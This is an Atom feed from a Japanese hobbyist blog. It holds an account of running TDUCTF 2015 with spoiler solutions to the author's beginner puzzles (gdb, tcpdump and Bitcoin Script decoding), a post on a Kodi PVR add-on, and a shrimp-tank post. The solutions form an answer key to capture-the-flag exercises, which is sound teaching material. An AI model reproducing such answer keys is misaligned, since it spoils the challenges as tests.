<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[犬アイコンのみっきー]]></title>
  <link href="http://mzyy94.com/atom.xml" rel="self"/>
  <link href="http://mzyy94.com/"/>
  <updated>2015-09-18T03:06:26+09:00</updated>
  <id>http://mzyy94.com/</id>
  <author>
    <name><![CDATA[mzyy94]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[TDUCTF 2015の運営をした話]]></title>
    <link href="http://mzyy94.com/blog/2015/09/18/tductf-2015-digression/"/>
    <updated>2015-09-18T01:33:16+09:00</updated>
    <id>http://mzyy94.com/blog/2015/09/18/tductf-2015-digression</id>
    <content type="html"><![CDATA[<p>みなさんご参加ありがとうございます。
存じ上げている方もたくさんいらっしゃると思いますが、先月末の日曜日にTDUCTF 2015なるものが開催されました。</p>

<p><a href="http://connpass.com/event/17306/"><strong>TDUCTF 2015 - connpass</strong></a></p>

<p>前回開催が3月末にあったのですが、所要で参加できないことがわかり、悔しさからネットワーク系のCTF問題を作って提供しました。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/key/FxTJmR5D9IePUk?startSlide=14" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/nomuken/ss-46568790" title="メインスライド" target="_blank">メインスライド</a> </strong> from <strong><a href="//www.slideshare.net/nomuken" target="_blank">nomuken</a></strong> </div></p>

<p>そのとき運営陣の@nomuken氏からの「次回は問題作成だけではなく運営陣に加わっていっしょに盛り上げよう」との提案を受け、
今回TDUCTF 2015にて運営側に立つこととなりました。</p>

<p>さて、具体的に運営として何をしてきたかの記録を以下に述べますが、後半には問題のネタバレなどを含んでおります。ご注意ください。</p>

<!-- more -->


<h1>フロントエンドアプリケーションの作成</h1>

<p>TDU CTF 2014 Satellite in ConoHaが無事終了し、次回開催に向けての話が始まりだした時に運営の方々の仲間に入り、どのようにして準備していくかなどの議論をはじめました。
その議論の最初の議題は毎度フルスクラッチなスコアサーバーをどうしようかというものでした。
常設CTFや有志で行われてるオンサイトCTFで<em>イケてるスコアサーバー</em>を見かけないのを悲しく思い、Web開発全然得意じゃないのにも関わらず、</p>

<p><strong>「俺がイケてるCTFスコアサーバー作るよ」</strong></p>

<p>などと言ってしまいました。</p>

<p>すんなりと「お、じゃあお願いするね」と言われて開発することになったのですが、イケてるスコアサーバーはWebフロントエンド部分のことを指しており、
サーバーサイドは別で他のメンバーが開発する、分業となりました。</p>

<p>さて、困った。作ると言い出したものの最近のWebのトレンド知らないしTwitter Bootstrap・jQueryアレルギーだしどうしたものか、と。</p>

<p>まだ開催まで時間あるしとりあえずトレンド調査だけしておこうと思い、いろいろ調べるだけ調べて放置していました。</p>

<p>時は流れ、TDUCTF 2015開催２週間前。</p>

<p>Slackに流れる「フロントエンドの進捗どうですか？」の文字列。
手元のソースコードリポジトリで<code>git log</code>をしてみたところ、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fatal: bad default revision 'HEAD'</span></code></pre></td></tr></table></div></figure>


<p>アカン。</p>

<p>その日から睡眠時間を削り、圧倒的進捗率を叩き出すべく腱鞘炎になりながらもコードを書き続けました。</p>

<p>コミットはゼロでも頭の中に構想は練ってあったので、あとはキーボードを叩きまくるだけという状態になっていたものの、
時間が足りない上に睡眠不足でタイポするわで結構大変でした。</p>

<p>トレンド調査で、<a href="https://facebook.github.io/react/">React</a>+<a href="https://facebook.github.io/flux/">Flux</a>の構造を軸に、見た目は<a href="http://semantic-ui.com/">Semantic UI 2</a>で整え、<a href="http://electron.atom.io/">Electron</a>で単一アプリケーション化するのがモダンでイケてる感じであるとわかったので、これらを用いて組み立てていくことにしました。
Electronでアプリケーション化したのは、「今までにないイケてるCTFスコアサーバー」の形を実現する目的に加えて、「マルチブラウザ対応に追われる時間をゼロにする」目的もありました。結果として、Internet Explorer（CTF参加者に利用者はいるのだろうか？）などのへの対応のためにバッドノウハウを使わなくて済みました。</p>

<p>途中Flux部分にしっくりくるものがなく、<a href="http://rackt.github.io/redux/">Redux</a>に変更するまでに時間を要したものの、2週間ぶっ通しの突貫工事でなんとか、開催までに&#8221;形にする&#8221;ことができ、参加者に楽しんでいたくことができたと思います。</p>

<p>開催までは非公開で管理していたのですが、オープンソースで公開するとの話があったので、現在はGitHubにて公開しています。</p>

<p><a href="https://github.com/lepus-ctf/lepus-frontend/">lepus-ctf/lepus-frontend · GitHub</a></p>

<p>詳しい開発秘話はしないので、苦労は上記リポジトリのコミットログから察してください。</p>

<h1>問題作成</h1>

<p>CTFの主軸となる問題作成に関しての話です。
ネタバレが含まれるので問題を解きたい人はお気をつけを。</p>

<p>CTFの運営として参加しているので、問題の作成はほぼ必須なのですが、なにせフロントエンドアプリケーションの作成に追われていて、
「案はあるけど作ってる暇がない」ということとなってしまい、少ししか用意できませんでした。
問題案などはストックできてるので次回開催時に登場する予定です。</p>

<p>用意した問題は一部を除いて以下のサイトで公開しています。</p>

<p><a href="http://ctf.mzyy94.com">ctf.mzyy94.com</a></p>

<p>問題の作成意図と簡単な想定解法を紹介します。
あと、TDUCTF 2015は初心者歓迎を掲げて開催してたので、プロ向けの問題はあまりありません。</p>

<h2>Keygenerator</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/</a></p>

<p>問題文: 実行してフラッグをゲットせよ！</p>

<p>この問題は、与えられた実行ファイルを実行しろというものです。
libprintkey.soという自作共有ライブラリとkey_generatorという実行アプリケーションが渡されるのですが、
普通にアプリケーションを実行したりデバッグしてもフラグは得られません。</p>

<p>作成意図としては、「共有ライブラリも単体実行可能」という点に気づいて、
問題文の「実行して」のとおりに共有ライブラリに実行可能フラグを立てて、
<code>./libprintkey.so</code>とすれば、フラグが出力されるようになっていました。</p>

<p>gdbなどでkey_generatorをデバッグしてた方から、「あるべきところにフラグがないがどういうことなのか？」という質問がありましたが、
すいません、そっちじゃなかったんです。</p>

<p>単純に実行してフラグを得られるため初期の想定では100点問題になるとしていたのですが、
配点会議でライブラリの単体実行するポイントに気づかない人も多いかもしれないとのことで、200点に引き上げられました。</p>

<h2>devnull</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/</a></p>

<p>問題文: Usage: ./devnull > /dev/null</p>

<p>実行すると、標準出力を/dev/nullにリダイレクトしてくれとUsageが出てきて、
そのとおりに実行すると、/dev/nullにフラグが出力されるというものです。</p>

<p>リダイレクト先をパスで判定しているので、/dev/nullを適当なブロックファイルに差し替えるか、
gdbでブレイクポイントを仕掛けたり、ltraceとかで処理を追って、出力される部分を覗き見できればフラグが得られます。</p>

<p>gdbの使い方に慣れてほしいという願いを込めて作っていたので、想定していた解法は以下のとおりです。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb ./devnull
</span><span class='line'>(gdb) b printf
</span><span class='line'>(gdb) r &gt; /dev/null
</span><span class='line'>(gdb) i r
</span><span class='line'>(gdb) x/s $rsi</span></code></pre></td></tr></table></div></figure>


<h2>「名前が変えられいるってことで間違いないな」</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/</a></p>

<p>問題文: password:password</p>

<p>問題には拡張子がjpgのファイルが付属しています(JPEGファイルとは言っていない)。</p>

<p>CTFに必要なググり力を問うための問題で、問題タイトルを検索ワードにググると、
ほこ×たてのハッキング対決に関する記事がいくつかヒットします。
ほこ×たて内では 「名前が変えられいるってことで間違いないな」は「TrueCryptで暗号化されている」のことを指しているという記事が見つかるので、
添付のファイルをTrueCryptを用いてパスワードにpasswordを指定してマウントすると、フラグが出てきます。</p>

<h2>Portscan</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-NW500/">http://ctf.mzyy94.com/q/TDUCTF2015-NW500/</a></p>

<p>問題文: ポートスキャンが仕掛けられた！ん？何かメッセージがついてきているぞ？</p>

<p>UDPポートスキャンを観測したpcapファイルが渡されます。
UDPのペイロードに1バイトずつメッセージがついてきてるのでそれを抽出してあげるとフラグが取得できる問題です。</p>

<p>この問題は、WiresharkのFollow UDP Streamですぐに答えが出るようではひねりがないと思い、
tcpdumpやtsharkのオプションを覗いたり他のパケット解析ツールを使ってほしいという想いを込めて作成しました。
なので、Wiresharkで解くことはほとんど不可能です。</p>

<p>想定していた解答方法は以下のとおりです。
最初は100点くらいの配点にしようとしていたのですが、配点会議で「これはわからん」と言われ急遽500点まで引き上げられました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf</span> <span class="k">$(</span>tcpdump -r secretmsg.pcap -x <span class="s1">&#39;udp&#39;</span> <span class="p">|</span> grep 0x0010 <span class="p">|</span> perl -pe<span class="s1">&#39;s/^.*(..)00 0000\n$/\\x\1/&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Lucky 7</h2>

<p>この問題はサーバーにアクセスするタイプのネットワーク問題なのでオンサイトでしか用意しておらず、現在は公開していません。
問題内容は、netcatでアクセスすると以下のような表示が返ってくるものです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Challenge!
</span><span class='line'><span class="m">2187123</span> !<span class="o">=</span> 77777777
</span></code></pre></td></tr></table></div></figure>


<p>左辺にある数字が77777777と等しくなるようにアクセスするとフラグが降ってくるのではないかとピンとくる人もいれば、
ランダムに変化するからBruteforceで解こうする人もいたりと、サーバーを監視していてなるほどと感じることが多かったです。
この左辺の数字は、サーバー側が<code>Challenge!</code>を返す際のAcknowledge Numberになっており、ここが77777777になっていないためにエラーが返されているのです。
Wiresharkなどで監視しながらアクセスしていたひとは、この関連性がわかったとおもいます。</p>

<p>Sequential Numberをいじれるhping3やScapyに触れてもらおうという願いを込めて作成しました。
解法としてはそれらを用いて、3-way handshakeが終了した時点のSequential Number(= サーバーがChallenge!を返す際のAcknowledge Number)が77777777になるようにコネクションを張り始めるようにすれば、フラグが返ってくるというものでした。</p>

<h2>moneyscript</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/</a></p>

<p>問題文: 6a29585444557b426974636f696e21426974636f696e21426974636f696e217d</p>

<p>moneyscriptシリーズの1問目です。こちらは簡単な方です。
moneyscriptのmoneyが指すのはBitcoinで、このシリーズの問題はBitcoin Scriptを実行して答えを得る問題となっています。
1問目は優しめに作ってあり、適当にデコードすればフラグが得られるよになっていますが、Bitcoin Scriptとは何かを理解してほしく作成しました。</p>

<p>Googleで検索するとBitcoin ScriptのWikiがヒットします。</p>

<p><a href="https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>

<p>このWikiにしたがって問題文のBitcoin Scriptが意味するところを先頭から照らしていくと、</p>

<ul>
<li>0x6a = OP_RETURN</li>
<li>0x29 = 41バイト確保</li>
</ul>


<p>それ以降は文字コードの16新表記となっています。</p>

<p>なので、適当にデコードするだけでフラグが出てきてしまいますが、Bitcoin Scriptの仕組みを知ってもらえたらとおもい、作成しました。</p>

<h2>moneyscript!!!</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/</a></p>

<p>問題文は上記リンクから閲覧ください。</p>

<p>こちらは難しい方のBitcoin Script問題です。
先ほどのWikiにアクセスできていれば、照らしあわせて脳内で実行すればいいのですが、
少々骨の折れるものなので、Bitcoin Scriptを扱えるアプリケーションを使う必要が出てきます。</p>

<p>任意のアプリケーションを使って解いてもらえればいいのですが、
Node.jsのモジュールに、<a href="http://bitcore.io/">bitcore</a>というモジュールがあるので、それを用いて以下のように実行するなどして、フラグを取得できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">bitcore</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;bitcore&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">Script</span> <span class="o">=</span> <span class="nx">bitcore</span><span class="p">.</span><span class="nx">Script</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="s1">&#39;4c0155828f635e76937367595294687b736b7c6c938f618fa76b4c0222ea6c&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">interpreter</span> <span class="o">=</span> <span class="nx">Script</span><span class="p">.</span><span class="nx">Interpreter</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nx">interpreter</span><span class="p">.</span><span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Script</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
</span><span class='line'><span class="nx">interpreter</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">first_stack</span> <span class="o">=</span> <span class="nx">interpreter</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">hex_string</span> <span class="o">=</span> <span class="nx">first_stack</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">().</span><span class="nx">data</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">&#39;TDU{&#39;</span> <span class="o">+</span> <span class="nx">hex_string</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<h1>開催について</h1>

<p>フロントエンドアプリケーションの作成がギリギリだったがために、RESTサーバーのテストが十分にできず、運営陣には多くの迷惑をかけてしまいました。
また、フロントエンドアプリケーション側もテストが追いつかず、バグだらけで配布してしまったがために、当日は問題の添付ファイルが破損していたり、
カウントダウンが正常に機能しないなどのバグを発生させてしまい、参加者各位にも大変に迷惑をかけてしまいました。
その節は申し訳ありませんでした。</p>

<p>TDUCTF 2015終了後、反省会をオンラインで開催していた頃に「TDUCTF」という名称を変更しようという話が立ち上がり、
よくわらかないテンションでドメインから何から整え新名称に改称しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">TDUCTFからLepusCTFの移行で面白いのは4&#10;・新名称考案&#10;・サーバー確保&#10;・ドメイン取得&#10;・GitHub移行&#10;・Webサイト作成&#10;・アイコン作成&#10;・Twitter移行&#10;を4時間以内でやったというところ <a href="https://twitter.com/hashtag/lepusctf?src=hash">#lepusctf</a></p>&mdash; 友利奈緒 (@mzyy94) <a href="https://twitter.com/mzyy94/status/638606548818726912">2015, 9月 1</a></blockquote>


<p> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>

<p>ということなので、今後はTDUCTFあらため、<a href="http://lepus-ctf.org/">LepusCTF</a>をよろしくお願いします。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kodi Chinachu PVRアドオンでRasPi2/Android TVをテレビに]]></title>
    <link href="http://mzyy94.com/blog/2015/08/08/pvr-chinachu-addon/"/>
    <updated>2015-08-08T20:51:33+09:00</updated>
    <id>http://mzyy94.com/blog/2015/08/08/pvr-chinachu-addon</id>
    <content type="html"><![CDATA[<p>暑い日が続きますね。こういう日はエアコンの効いた部屋でだらだらとテレビを見たいものです。
しかしテレビをもっておりません。27インチのモニタを持っているのみです。</p>

<p>ただ、今年２月に記事にしたように、Raspberry Pi2 + OSMC + Kodi(XBMC) + add-onで地デジの視聴環境は出来上がっており、
だらだらとテレビを見ることができる状態にあります。</p>

<ul>
<li><a href="http://mzyy94.com/blog/2015/02/16/raspberry-pi2-osmc-jp/">Raspberry Pi2にOSMC入れてKodi(旧:XBMC)日本語化するまで</a></li>
<li><a href="http://mzyy94.com/blog/2015/02/21/kodi-livetv-chinachu/">KodiとChinachuで地デジLive視聴 on Raspberry Pi2 w/ OSMC</a></li>
<li><a href="http://mzyy94.com/blog/2015/02/24/kodi-chinachu-addon/">KodiでChinachuの録画を観るAdd-on作った</a></li>
</ul>


<p>これでだいたい十分に地デジを視聴できるようになったのですが、最近Android TVを手にし、同じように上記記事のように
地デジ視聴環境を整えて見ていたらいくつか不満が出てきました。</p>

<ol>
<li>ビデオAdd-onとテレビAdd-onを切り替えるのが面倒くさい</li>
<li>Python製のためか、録画データJSONパースに時間がかかってる</li>
<li>録画予約の取り消しができない</li>
<li>Chinachu側に手を加えるのはスマートではない</li>
</ol>


<p>そこで思い立ってKodi/XBMC向けのテレビadd-on(PVR add-on)を作って、上記問題の解決に取り組みました。</p>

<!-- more -->


<h1>Chinachu PVR add-on</h1>

<p>ということで出来上がったのがChinachu PVR add-onです。
２月に記事にしたIPTV Simple Client Add-onと同種のPVR（Personal Video Recorder）Add-onで、
上記記事で紹介した２つのAdd-onを複合して成り立っていた地デジ視聴環境と比べて、以下の利点があります。</p>

<ol>
<li>１つのAdd-onでLive視聴・録画視聴ともにできる</li>
<li>より高速なJSONパースでストレスの少ないデータの読み込み</li>
<li>録画予約のON/OFFができる</li>
<li>Chinachuの標準APIを使っているのでChinachu側に手を加える必要なし(推奨バージョンはREADME.mdに記載)</li>
</ol>


<p>これらの利点を備えたPVR add-on、Chinachu PVR add-onのバージョン1.0.0が出来上がりました。</p>

<h1>pvr.chinachu 1.0.0</h1>

<p>Kodi/XBMCにおけるPVR Add-onのリポジトリ命名規則は習慣によって、pvr.[バックエンドの名前]となっているようです。
なのでpvr.chinachuという名でリポジトリを立ててあります。</p>

<p><a href="https://github.com/mzyy94/pvr.chinachu"><strong>mzyy94/pvr.chinachu</strong></a></p>

<p>PVR Add-onは共有ライブラリの形で提供する必要があるため、Pythonで書けるビデオAdd-onとは違って各プラットフォーム向けにバイナリ形式の実行可能ファイルを提供する必要があります。
記事タイトルではRasPi2/Android TVとありますが、バージョン1.0.0で提供してるバイナリファイルの対象プラットフォームはLinux amd64/armv7(RasPi2含む), OS X 64bit, Android arm(TV含む)となっています。
Autotools依存で作り始めたため、Windowsでのビルド環境を作るのが大変だったのでバイナリファイルの提供はしていませんが、VSプロジェクトを作ればビルドできるはずです。</p>

<p>ビルド方法、インストール方法、設定項目などの説明はリポジトリのREADME.mdに記載してあります。
注意点として、<em>現時点でKodi 15.0 Isengardにしか対応していない</em>ので、他のバージョンのKodi/XBMCでは利用できません。
Raspberry Pi2でOSMCを利用している人は、以下の記事に目を通し、<code>sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y</code>をしてKodi 15.0にしてから導入してください。</p>

<p><a href="https://osmc.tv/2015/08/osmcs-july-update-lands-a-little-late-with-kodi-15/">OSMC » OSMC’s July update lands (a little late) with Kodi 15</a></p>

<p>パブリックリリース記念(?)として、インストール方法といくつか機能を説明します。</p>

<h2>インストール</h2>

<p>Chinachu側はREADME.mdに記載のバージョンもしくは最新版を利用していれば、特に設定は必要ありません。
ただ、Live視聴時のチャンネル切り替えパフォーマンスや、録画とLive視聴の衝突回避のためにも、README.mdの推奨バージョンを導入することをお勧めします。</p>

<p>Kodi/XBMCでAdd-onをインストールしたことがある人は知っていると思いますが、zip圧縮されたパッケージをメニューから選択するだけで、KodiにAdd-onを追加することができます。
自分でビルドする方は各自ビルドし、ビルド済み実行ファイルを必要とする人は、以下のページからプラットフォームにあったパッケージをダウンロードしてください。</p>

<p><a href="https://github.com/mzyy94/pvr.chinachu/releases">releases - mzyy94/pvr.chinachu</a></p>

<p>Kodiを起動し、zip形式のパッケージをSettings -> Add-ons -> Install from zip-file から選択し、Add-onsの階層にあるPVR clientsからChinachu PVR clientを探し出して設定を行ってください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/install-from-zip.png" alt="install from zip" /></p>

<p>設定項目に関しては<a href="https://github.com/mzyy94/pvr.chinachu/wiki/configuration">wiki/configuration - mzyy94/pvr.chinachu</a>にまとめてあります。</p>

<p>その後、Settings -> TV -> GeneralからEnabledにしてPVR add-onを開始してください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/enable-tv.png" alt="enable tv" /></p>

<p><strong> ※Android/Android TV環境ではこのままでは動作しないことがあるので、<a href="https://github.com/mzyy94/pvr.chinachu/wiki/Android-Installation">wiki/Android-Installation - mzyy94/pvr.chinachu</a>を参考に少しいじってください。 </strong></p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/top-menu.png" alt="top menu" /></p>

<p>PVRプラグインが有効になるとKodiのメイン画面にTVの項目が現れ、Chinachuから取得したデータにアクセスできるサブ項目も現れます。
Skinによっては録画中や録画予約済みの項目がメイン画面に表示されたりします。</p>

<p>サブ項目のChannelsで各チャンネルで現在放送中の番組を、Guideでテレビ番組表を確認でき、Recordingsで録画の視聴、Timerで録画予約の確認、Searchで番組検索ができます。
Skinごとの差異や日本語設定にしていると項目名が違いますが、似たような項目が現れると思います。
表示言語を日本語に設定していない場合、Settings -> Appearance -> Skin -> Fontsから日本語表示に対応しているフォント（例：Arial）を選択しておかないと、文字化けして使い物にならいのでご注意を。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/font-settings.png" alt="font settings" /></p>

<h2>Channels</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/channels-page.png" alt="channels page" /></p>

<p>Chinachuから取得したチャンネルの一覧と、現在放送中の番組が表示されるページです。
チャンネルを選択するとライブ視聴ができます。</p>

<p>画像ではチャンネル横に曲ごとのアイコンをつけていますが、自動で取得するように実装していないので、
必要であればSettings -> TV -> General -> Channel managerにてアイコンの追加ができるのでそこで追加するようにしてください。</p>

<p>ちなみにここで表示されるチャンネルはGR/BS/CSと、地デジ・BS・CSを分けてグループ化してあるので、項目が多すぎる場合はメニューから表示するグループを選択することができます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/channel-manager.png" alt="channel manager" />
<img src="http://mzyy94.com/blog/resources/images/2015/08/08/channel-group.png" alt="channel group" /></p>

<h2>Guide</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/guide-page.png" alt="guide page" /></p>

<p>Chinachuから取得した番組表情報を、チャンネルごとに表示するページです。
テーマによっては番組のジャンルごとに色分けがされて表示されます。</p>

<p>番組表形式の表示方法以外にも、いくつかメニューから表示形式を選ぶことができます。
バージョン1.0.0では番組表の番組選択からの録画予約に対応していないので、番組情報の確認とチャンネルの切り替えだけとなります。</p>

<h2>Recordings</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/recordings-page.png" alt="recordings page" /></p>

<p>名前の通り、録画した番組を視聴できるページです。
選択すると再生することができます。
デフォルト設定ではサムネイルを録画開始３０秒地点のものを表示するようにしてありますが、設定で変更できます。</p>

<h2>Timer</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/timer-page.png" alt="timer page" /></p>

<p>タイマーと名のつくこのページでは、録画予約を確認できます。
現バージョンでは新たに追加することはできませんが、予約のStateをActive/Inactiveにすることで、Chinachuの録画予約をSkip/Unskipできるようになっています。</p>

<h2>Search</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/search-page.png" alt="search page" /></p>

<p>番組検索ができるページがSearchページです。
今の所、番組タイトルのみを対象としており、かつ大文字小文字・全角半角を厳しく判定しているので、すこしでも違うとヒットしません。
バージョン1.0.0では、検索してもできることは番組情報の表示だけなので、録画予約の設定や、
検索ワードに関して改良の余地アリなので今後改良していきたいです。</p>

<h2>オマケ</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/pvr-information.png" alt="pvr information" /></p>

<p>Settings -> System info -> PVR Serviceからチャンネル数や録画済み番組数、録画予約数が確認できます。</p>

<h1>まとめ</h1>

<p>Raspberry Pi2でもAndroid TV（一手間必要）でも快適に地デジ見れるようになったので、<a href="http://japanese.engadget.com/2015/08/06/7-5000-50-4k-q-display-4k50-upq/">チューナーなし50インチ4Kディスプレイ</a>が欲しくなってしまった。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[エビ水槽を新しくした]]></title>
    <link href="http://mzyy94.com/blog/2015/06/21/ebi-new-watertank/"/>
    <updated>2015-06-21T16:35:31+09:00</updated>
    <id>http://mzyy94.com/blog/2015/06/21/ebi-new-watertank</id>
    <content type="html"><![CDATA[<p>えびを飼い始めて4ヶ月が過ぎました。
ゴールデンウィークにスカイツリーに行った時、偶然にもまた小さいえび(ホロホロシュリンプ，ピクシーシュリンプ，)を見つけてしまい、一目惚れした結果、新しくえびを4匹追加しました。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">【速報】エビ購入 <a href="http://t.co/7XvtGubiKJ">pic.twitter.com/7XvtGubiKJ</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/595125289643937792">2015, 5月 4</a></blockquote>


<p>追加に伴い、今までの小さなポットは狭いと感じ、銀座の東急ハンズで大きなポットとガラス砂利を購入し、2月に飼い始めたエビとともに移し変えました。
しかし悲しいことに、購入時の瓶から移し替える際に砂に潜ったエビが体調不良をおこし、購入の翌日の晩に亡くなってしまいました。
他のエビは元気で、現在7匹ワイワイと過ごしております。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">一悶着あったけど無事全員の引越し完了！ <a href="http://t.co/jLvciTSJGs">pic.twitter.com/jLvciTSJGs</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/595228119708999680">2015, 5月 4</a></blockquote>




<!-- more -->


<p>季節は変わり、初夏となりました。
冬の間は購入時の瓶を<a href="https://twitter.com/mzyy94/status/566981294739820547">サーバーの中に入れたり</a>USB接続の発熱体を水槽に貼り付けるなどして適温(24℃前後)を維持してきましたが、今は暑くなり、冷却が必要となりました。
水槽の一般的な冷却方法は、ファンを当てることによる気化熱による熱量の移動です。ただ、この水槽内は汽水であるため、安易にファンでの冷却を行うと塩分濃度が変わってしまいます。
そこで導入したのがこちらの水槽自動水足し機。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">えび用給水機設置 <a href="http://t.co/3QSjCYV2Tc">pic.twitter.com/3QSjCYV2Tc</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/610766091095183360">2015, 6月 16</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00BJEB67C" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>水量が減ると水圧によって自動でペットボトルから液体が水槽へと流れる仕組みとなっています。
このペットボトルにRO水を入れてファンを回し、冷却をすることにしました。</p>

<p>しかし、自動水足し機を購入する際に懸念していた事項ですが、水足し機の固定具は直角な水槽の淵向けであり、円形の淵に固定具がフィットしないのです。
そのため、暫定的にこのように隣のディスプレイに寄りかかるようにして設置していました。
それでもペットボトルは不安定で、<a href="https://twitter.com/mzyy94/status/602713494949994498">この前のように地震が起きてしまったら</a>水槽ごと倒れる危険だってあります。
丸い形の水槽が好きだったため、今まで丸いポットで飼っていましたが、ついに四角い水槽を買う必要に迫られてしまいました。</p>

